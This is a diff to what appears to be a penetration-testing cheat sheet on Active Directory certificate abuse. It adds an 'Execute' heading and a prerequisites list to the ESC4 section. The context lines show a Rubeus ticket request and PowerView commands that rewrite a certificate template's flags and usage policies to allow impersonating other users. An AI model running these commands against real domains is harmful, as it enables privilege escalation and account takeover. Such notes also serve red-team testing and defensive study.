@@ -119,6 +119,8 @@ Rubeus.exe asktgt /user:TargetUser /certificate:C:\Temp\cert.pfx
 
 ## ESC4
 
+### Execute
+
 ```bash
 ### CERTIPY
 # PAY ATTENTION TO "Write Owner Principals", "Write Dacl Principals", "Write Property Principals"
@@ -141,3 +143,8 @@ Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services
 Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -XOR @{'mspki-certificate-name-flag' = '1'}
 Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Set @{'mspki-certificate-application-policy' = '1.3.6.1.5.5.7.3.2', '1.3.6.1.5.5.7.3.4', '1.3.6.1.4.1.311.10.3.4'}
 ```
+
+### Prerequisites
+
+1. Template Security Permissions: Owner / WriteOwnerPrincipals / WriteDaclPrincipals / WritePropertyPrincipals.
+2. Template has to be enabled
